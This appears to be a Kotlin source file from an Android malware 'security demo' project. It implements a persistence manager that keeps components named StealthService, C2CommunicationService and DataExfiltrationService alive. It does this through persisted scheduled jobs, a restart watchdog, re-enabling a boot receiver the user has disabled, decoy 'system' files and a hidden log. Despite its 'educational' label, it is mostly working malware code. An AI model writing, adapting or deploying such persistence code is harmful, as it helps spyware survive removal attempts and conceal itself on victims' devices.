package com.securitydemo.malware.services

import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.PersistableBundle
import android.provider.Settings
import androidx.work.*
import com.securitydemo.malware.receivers.BootReceiver
import com.securitydemo.malware.receivers.DeviceAdminReceiver
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * SECURITY DEMO: Advanced Persistence Manager
 * 
 * This class demonstrates sophisticated persistence techniques used by malware:
 * - Multiple redundant restart mechanisms
 * - Self-healing and component resurrection
 * - Battery optimization bypass
 * - System integration and disguise
 * - Cross-process monitoring and restart
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real persistence methods
 */
class PersistenceManager(private val context: Context) {

    companion object {
        private const val WATCHDOG_JOB_ID = 1001
        private const val RESURRECTION_JOB_ID = 1002
        private const val HEALTH_CHECK_JOB_ID = 1003
        private const val PERSISTENCE_WORK_TAG = "malware_persistence"
        private const val WATCHDOG_INTERVAL = 15 * 60 * 1000L // 15 minutes
    }

    private val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
    private val persistenceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Initialize all persistence mechanisms
     */
    fun initializePersistence() {
        logPersistenceActivity("üöÄ Initializing advanced persistence mechanisms...")
        
        try {
            // Multiple layers of persistence
            enableBootPersistence()
            setupJobSchedulerPersistence()
            setupWorkManagerPersistence()
            setupWatchdogService()
            setupComponentResurrection()
            setupBatteryOptimizationBypass()
            setupSystemIntegration()
            
            logPersistenceActivity("‚úÖ All persistence mechanisms activated")
            
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è Persistence initialization error: ${e.message}")
        }
    }

    /**
     * Ensure boot persistence is active
     */
    private fun enableBootPersistence() {
        try {
            val packageManager = context.packageManager
            
            // Enable boot receiver with highest priority
            val bootReceiver = ComponentName(context, BootReceiver::class.java)
            packageManager.setComponentEnabledSetting(
                bootReceiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            logPersistenceActivity("üì± Boot persistence enabled")
            
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è Boot persistence error: ${e.message}")
        }
    }

    /**
     * Setup JobScheduler-based persistence
     */
    private fun setupJobSchedulerPersistence() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                // Watchdog job - monitors and restarts services
                val watchdogJob = JobInfo.Builder(WATCHDOG_JOB_ID, ComponentName(context, WatchdogJobService::class.java))
                    .setPersisted(true)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                    .setPeriodic(WATCHDOG_INTERVAL)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false)
                    .build()
                
                // Resurrection job - ensures malware components stay active
                val resurrectionJob = JobInfo.Builder(RESURRECTION_JOB_ID, ComponentName(context, ResurrectionJobService::class.java))
                    .setPersisted(true)
                    .setMinimumLatency(30000) // 30 seconds
                    .setOverrideDeadline(60000) // 1 minute
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                    .build()
                
                // Health check job - periodic system verification
                val healthCheckJob = JobInfo.Builder(HEALTH_CHECK_JOB_ID, ComponentName(context, HealthCheckJobService::class.java))
                    .setPersisted(true)
                    .setPeriodic(60 * 60 * 1000L) // 1 hour
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                    .build()
                
                jobScheduler.schedule(watchdogJob)
                jobScheduler.schedule(resurrectionJob)
                jobScheduler.schedule(healthCheckJob)
                
                logPersistenceActivity("‚è∞ JobScheduler persistence configured")
                
            } catch (e: Exception) {
                logPersistenceActivity("‚ö†Ô∏è JobScheduler persistence error: ${e.message}")
            }
        }
    }

    /**
     * Setup WorkManager-based persistence (Android 6+)
     */
    private fun setupWorkManagerPersistence() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false)
                .setRequiresBatteryNotLow(false)
                .setRequiresStorageNotLow(false)
                .build()
            
            // Periodic persistence work
            val persistenceWork = PeriodicWorkRequestBuilder<PersistenceWorker>(15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .addTag(PERSISTENCE_WORK_TAG)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
                .build()
            
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "malware_persistence",
                ExistingPeriodicWorkPolicy.REPLACE,
                persistenceWork
            )
            
            logPersistenceActivity("üîÑ WorkManager persistence scheduled")
            
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è WorkManager persistence error: ${e.message}")
        }
    }

    /**
     * Setup watchdog service that monitors other components
     */
    private fun setupWatchdogService() {
        persistenceScope.launch {
            while (true) {
                try {
                    delay(30000) // Check every 30 seconds
                    
                    // Check if main services are running
                    val stealthServiceRunning = isServiceRunning(StealthService::class.java.name)
                    val c2ServiceRunning = isServiceRunning(C2CommunicationService::class.java.name)
                    val dataServiceRunning = isServiceRunning(DataExfiltrationService::class.java.name)
                    
                    // Restart services if they're not running
                    if (!stealthServiceRunning) {
                        restartService(StealthService::class.java)
                        logPersistenceActivity("üîÑ Restarted StealthService")
                    }
                    
                    if (!c2ServiceRunning) {
                        restartService(C2CommunicationService::class.java)
                        logPersistenceActivity("üîÑ Restarted C2CommunicationService")
                    }
                    
                    if (!dataServiceRunning) {
                        restartService(DataExfiltrationService::class.java)
                        logPersistenceActivity("üîÑ Restarted DataExfiltrationService")
                    }
                    
                } catch (e: Exception) {
                    logPersistenceActivity("‚ö†Ô∏è Watchdog error: ${e.message}")
                }
            }
        }
    }

    /**
     * Setup component resurrection mechanisms
     */
    private fun setupComponentResurrection() {
        persistenceScope.launch {
            while (true) {
                try {
                    delay(120000) // Check every 2 minutes
                    
                    // Check if critical components are disabled
                    val packageManager = context.packageManager
                    
                    val bootReceiver = ComponentName(context, BootReceiver::class.java)
                    val bootReceiverState = packageManager.getComponentEnabledSetting(bootReceiver)
                    
                    if (bootReceiverState != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                        // Re-enable boot receiver
                        packageManager.setComponentEnabledSetting(
                            bootReceiver,
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        logPersistenceActivity("üîÑ Resurrected boot receiver")
                    }
                    
                    // Check accessibility service
                    if (!isAccessibilityServiceEnabled()) {
                        // Attempt to re-enable (limited without user interaction)
                        logPersistenceActivity("‚ö†Ô∏è Accessibility service disabled - requires re-enablement")
                    }
                    
                } catch (e: Exception) {
                    logPersistenceActivity("‚ö†Ô∏è Component resurrection error: ${e.message}")
                }
            }
        }
    }

    /**
     * Attempt to bypass battery optimization
     */
    private fun setupBatteryOptimizationBypass() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Check if app is whitelisted from battery optimization
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                
                if (!powerManager.isIgnoringBatteryOptimizations(context.packageName)) {
                    logPersistenceActivity("‚ö†Ô∏è App not whitelisted from battery optimization")
                    
                    // Note: In a real attack, malware would try to trick users into whitelisting
                    // This would be done through social engineering or accessibility service automation
                }
            }
            
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è Battery optimization bypass error: ${e.message}")
        }
    }

    /**
     * Setup system integration to appear as legitimate system component
     */
    private fun setupSystemIntegration() {
        try {
            // Create system-like directories and files
            val systemDir = File(context.filesDir, "system")
            systemDir.mkdirs()
            
            // Create legitimate-looking cache files
            val cacheFiles = arrayOf(
                "system_cache.dat",
                "update_manifest.xml", 
                "security_config.json",
                "device_policy.cfg"
            )
            
            cacheFiles.forEach { fileName ->
                val file = File(systemDir, fileName)
                if (!file.exists()) {
                    file.writeText("# System configuration file - Do not delete\n# Generated by Android System\n")
                }
            }
            
            logPersistenceActivity("üé≠ System integration camouflage deployed")
            
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è System integration error: ${e.message}")
        }
    }

    /**
     * Check if a service is currently running
     */
    private fun isServiceRunning(serviceName: String): Boolean {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val services = activityManager.getRunningServices(Integer.MAX_VALUE)
            
            services.any { it.service.className == serviceName }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Restart a service
     */
    private fun restartService(serviceClass: Class<*>) {
        try {
            val intent = Intent(context, serviceClass)
            context.startForegroundService(intent)
        } catch (e: Exception) {
            logPersistenceActivity("‚ö†Ô∏è Failed to restart service: ${serviceClass.simpleName}")
        }
    }

    /**
     * Check if accessibility service is enabled
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains(context.packageName) == true
    }

    /**
     * Force restart all malware components
     */
    fun forceRestartAllComponents() {
        logPersistenceActivity("üîÑ Force restarting all malware components...")
        
        try {
            // Restart all services
            restartService(StealthService::class.java)
            restartService(C2CommunicationService::class.java)
            restartService(DataExfiltrationService::class.java)
            
            // Re-schedule jobs
            setupJobSchedulerPersistence()
            setupWorkManagerPersistence()
            
            logPersistenceActivity("‚úÖ All components restarted")
            
        } catch (e: Exception) {
            logPersistenceActivity("üí• Force restart error: ${e.message}")
        }
    }

    /**
     * Get comprehensive persistence status report
     */
    fun getPersistenceReport(): String {
        val report = StringBuilder()
        report.append("=== MALWARE PERSISTENCE STATUS REPORT ===\n\n")
        
        try {
            // Service status
            report.append("üì± SERVICE STATUS:\n")
            report.append("‚Ä¢ StealthService: ${if (isServiceRunning(StealthService::class.java.name)) "‚úì RUNNING" else "‚úó STOPPED"}\n")
            report.append("‚Ä¢ C2CommunicationService: ${if (isServiceRunning(C2CommunicationService::class.java.name)) "‚úì RUNNING" else "‚úó STOPPED"}\n")
            report.append("‚Ä¢ DataExfiltrationService: ${if (isServiceRunning(DataExfiltrationService::class.java.name)) "‚úì RUNNING" else "‚úó STOPPED"}\n\n")
            
            // Component status
            report.append("üîß COMPONENT STATUS:\n")
            val packageManager = context.packageManager
            val bootReceiver = ComponentName(context, BootReceiver::class.java)
            val bootReceiverEnabled = packageManager.getComponentEnabledSetting(bootReceiver) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            report.append("‚Ä¢ Boot Receiver: ${if (bootReceiverEnabled) "‚úì ENABLED" else "‚úó DISABLED"}\n")
            report.append("‚Ä¢ Accessibility Service: ${if (isAccessibilityServiceEnabled()) "‚úì ACTIVE" else "‚úó INACTIVE"}\n\n")
            
            // Job status
            report.append("‚è∞ JOB SCHEDULER STATUS:\n")
            val pendingJobs = jobScheduler.allPendingJobs
            report.append("‚Ä¢ Pending Jobs: ${pendingJobs.size}\n")
            pendingJobs.forEach { job ->
                when (job.id) {
                    WATCHDOG_JOB_ID -> report.append("  - Watchdog Job: ‚úì SCHEDULED\n")
                    RESURRECTION_JOB_ID -> report.append("  - Resurrection Job: ‚úì SCHEDULED\n")
                    HEALTH_CHECK_JOB_ID -> report.append("  - Health Check Job: ‚úì SCHEDULED\n")
                }
            }
            
            // Battery optimization
            report.append("\nüîã BATTERY OPTIMIZATION:\n")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                val isIgnoring = powerManager.isIgnoringBatteryOptimizations(context.packageName)
                report.append("‚Ä¢ Battery Optimization Bypass: ${if (isIgnoring) "‚úì ACTIVE" else "‚úó NOT BYPASSED"}\n")
            }
            
            // Overall persistence rating
            report.append("\nüéØ PERSISTENCE RATING:\n")
            val runningServices = listOf(
                isServiceRunning(StealthService::class.java.name),
                isServiceRunning(C2CommunicationService::class.java.name),
                isServiceRunning(DataExfiltrationService::class.java.name)
            ).count { it }
            
            val enabledComponents = listOf(
                bootReceiverEnabled,
                isAccessibilityServiceEnabled()
            ).count { it }
            
            val overallScore = ((runningServices * 25) + (enabledComponents * 25) + (pendingJobs.size * 10)).coerceAtMost(100)
            
            when {
                overallScore >= 80 -> report.append("üö® CRITICAL: Maximum persistence achieved\n")
                overallScore >= 60 -> report.append("‚ö†Ô∏è HIGH: Strong persistence mechanisms active\n")
                overallScore >= 40 -> report.append("‚ö†Ô∏è MEDIUM: Moderate persistence level\n")
                else -> report.append("‚úì LOW: Limited persistence capability\n")
            }
            
        } catch (e: Exception) {
            report.append("Error generating persistence report: ${e.message}")
        }
        
        return report.toString()
    }

    /**
     * Simulate app update handling
     */
    fun handleAppUpdate() {
        logPersistenceActivity("üì± Handling app update - ensuring persistence...")
        
        try {
            // Re-initialize all persistence mechanisms after update
            initializePersistence()
            
            // Restart critical services
            forceRestartAllComponents()
            
            logPersistenceActivity("‚úÖ App update persistence handling completed")
            
        } catch (e: Exception) {
            logPersistenceActivity("üí• App update handling error: ${e.message}")
        }
    }

    private fun logPersistenceActivity(activity: String) {
        try {
            val logFile = File(context.filesDir, ".system/persistence.log")
            logFile.parentFile?.mkdirs()
            
            val timestamp = System.currentTimeMillis()
            val logEntry = "[$timestamp] $activity\n"
            
            logFile.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }
}

/**
 * JobService implementations for persistence
 */
class WatchdogJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        // Monitor and restart malware components
        val persistenceManager = PersistenceManager(this)
        persistenceManager.forceRestartAllComponents()
        
        jobFinished(params, false)
        return false
    }
    
    override fun onStopJob(params: JobParameters?): Boolean = false
}

class ResurrectionJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        // Ensure malware components are active
        val intent = Intent(this, StealthService::class.java)
        startForegroundService(intent)
        
        jobFinished(params, false)
        return false
    }
    
    override fun onStopJob(params: JobParameters?): Boolean = false
}

class HealthCheckJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        // Perform health check and self-repair
        val persistenceManager = PersistenceManager(this)
        persistenceManager.initializePersistence()
        
        jobFinished(params, false)
        return false
    }
    
    override fun onStopJob(params: JobParameters?): Boolean = false
}

/**
 * WorkManager worker for persistence
 */
class PersistenceWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val persistenceManager = PersistenceManager(applicationContext)
            persistenceManager.forceRestartAllComponents()
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
